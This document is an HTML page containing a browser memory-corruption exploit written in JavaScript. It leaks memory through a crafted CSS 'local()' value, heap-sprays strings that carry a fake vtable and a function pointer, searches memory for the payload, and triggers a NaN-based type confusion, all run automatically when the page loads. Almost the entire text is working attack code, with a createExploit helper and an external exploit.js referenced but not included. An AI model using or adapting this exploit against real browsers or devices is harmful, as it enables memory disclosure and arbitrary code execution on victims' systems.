<html>
<head>
<script>


			function fromIEEE754(bytes, ebits, fbits)
			{
				var bits = [];
				
				for (var i = bytes.length; i; i -= 1)
				{
					var byte = bytes[i - 1];
					
					for (var j = 8; j; j -= 1)
					{
						bits.push(byte % 2 ? 1 : 0); byte = byte >> 1;
					}
				}
				
				bits.reverse();
				var str = bits.join('');
			   
				var bias = (1 << (ebits - 1)) - 1;
				var s = parseInt(str.substring(0, 1), 2) ? -1 : 1;
				var e = parseInt(str.substring(1, 1 + ebits), 2);
				var f = parseInt(str.substring(1 + ebits), 2);
				 
				if (e === (1 << ebits) - 1)
				{
					return f !== 0 ? NaN : s * Infinity;
				}
				else if (e > 0)
				{
					return s * Math.pow(2, e - bias) * (1 + f / Math.pow(2, fbits));
				}
				else if (f !== 0)
				{
					return s * Math.pow(2, -(bias-1)) * (f / Math.pow(2, fbits));
				}
				else
				{
					return s * 0;
				}
			}
			
			function Repeat(s, n)
			{
				var a = [];
				
				while(a.length < n)
				{
					a.push(s);
				}
				return a.join('');
			}
			
			function toNonScientificNotation(input)
			{
				var res = input.toString();
				var split = res.split("e");
				
				if (split.length > 1)
				{
					var power = parseInt(split[1]);
					
					if (power > 0)
					{
						var pointsplit = split[0].split(".");
						power -= pointsplit[1].length;
						res = pointsplit[0] + pointsplit[1] + Repeat("0", power) + ".0";
					}
					
					else if (power < 0)
					{
						var pointsplit = split[0].split(".");
						res = "0." + Repeat("0", (-power)-1) + pointsplit[0] + pointsplit[1];
					}
				}
				
				return res;
			}
			
			function generateExploit(address, size)
			{
				var hex = new Array
				(
					(size >> 24) & 0xFF,
					(size >> 16) & 0xFF,
					(size >> 8) & 0xFF,
					(size) & 0xFF,
					(address >> 24) & 0xFF,
					(address >> 16) & 0xFF,
					(address >> 8) & 0xFF,
					(address) & 0xFF
				);
				
				return toNonScientificNotation(fromIEEE754(hex, 11, 52));
			}
			
			function readMemory(address, size)
			{
				var exploit = document.getElementById('exploit');
				exploit.style.src = 'local(' + generateExploit(address, size) + ')';
				return exploit.style.src;
			}
			
			function hexh2bin(hex_val)
			{
				var str = "";
				var half = hex_val & 0xFFFF;
				
				// get hex
				str = half.toString(16);
				
				// pad as needed
				if (str.length < 3)
				{
					str = "%" + Repeat("0", 2 - str.length) + str;
				}
				else
				{
					str = "%u" + Repeat("0", 4 - str.length) + str;;
				}
				
				return unescape(str);
			}
			
			function hexw2bin(hex_val)
			{
				// 1 word = 2 halfs
				return "" + hexh2bin(hex_val) + "" + hexh2bin(hex_val >> 16);
			}
			
			function setCharAt(str,index,chr) 
			{
				if(index > str.length-1) return str;
				return str.substr(0,index) + chr + str.substr(index+1);
			}
			
			String.prototype.replaceAt=function(index, char) 
			{
				return this.substr(0, index) + char + this.substr(index+char.length);
			}
			
			function findExploit(payload_addr, exploit_data)
			{
				var start = payload_addr;
				var first = exploit_data.charCodeAt(0);
				while (1)
				{
					var data = readMemory(start, 0x100000);
				
					// move past "local("
					data = data.substr(6, 0x100000);

					// text = "";
					// for (var i = 0; i < 0x100; ++i)
					// 	text += data.charCodeAt(i).toString(16) + ",";
					// alert(text);
					
					// loop for tag
					for (var i = 0; i < 0x100000; i++)
					{
						// check for "/*"
						if (data.charCodeAt(i) == first)
						{
							// ok, convert line to text
							var text = "";
							var first = "", second = "";
							
							// loop next 5 bits
							var match = true;
							for (var k = 0; k < exploit_data.length; ++k)
							{
								// convert to string
								if (data.charCodeAt(i + k) != exploit_data.charCodeAt(k)) {
									match = false;
									break;
								}

								first += data.charCodeAt(i+k).toString(16);
								second += exploit_data.charCodeAt(k).toString(16);
							}
							// alert(i.toString(16) + " " + first + " " + second);

							// we got a complete match
							if (match)
								return start + 2 * i;
						}
					}
					start += 0x100000;
				}
				// uhoh.
				alert("Exploit could not be located.");
				
				return 0;
			}
			
			function trigger(exploit_addr)
			{
				// dump data
				var span = document.createElement("div");
				document.getElementById("BodyID").appendChild(span);
				span.innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");
			}
			
			sprayed = [];
			function spray(data, length) {
				while (data.length % 16 != 0)
					data += "~";
				var t = "";
				while (t.length < 0x1000)
					t += data;
				var out = "";
				while (out.length < length - t.length)
					out += t;
				while (out.length < length)
					out += "#";
				sprayed.push(out);
			}

			function p32(x) {
				return String.fromCharCode(x & 65535, x >> 16);
			}

			function initROP()
			{
				var infloop = 0x89C00A4F;

				var payload = ""; // that's our vtable
				for (var i = 0; i < 12; ++i)
					payload += p32(0);
				payload += p32(infloop); // function ptr which is executed
				arr = [];
				for (var i = 0; i < 0x1000; ++i)
					arr.push(new String(payload + i));
				// spray(payload, 0x800000);
				// alert("sprayed");

				// get the payload address
				var payload_addr = findExploit(0x889F0000, payload);
				alert("payload = 0x" + payload_addr.toString(16));
				// hexdump(payload_addr, 0x20);
				
				// create data
				var exploit = createExploit(payload_addr);

				// spray exploit
				for (var i = 0; i < 0x10000; ++i)
					arr.push(new String(exploit + " " + i));

				// now find it!
				var exploit_addr = findExploit(payload_addr, exploit) + 0x10;
				alert("exploit = 0x" + exploit_addr.toString(16));

/*
				for (var i = 0; i < 2; ++i) {
					hexdump(payload_addr, 0x20);
					hexdump(exploit_addr, 0x20);
				}
*/
				alert("trigger");

				// trigger exploit
				trigger(exploit_addr);
			}
			
		</script>
	</head>
	<body id="BodyID" onload="initROP();">
		<div id="exploit" />
	</body>
</html>

<script src="exploit.js"></script>
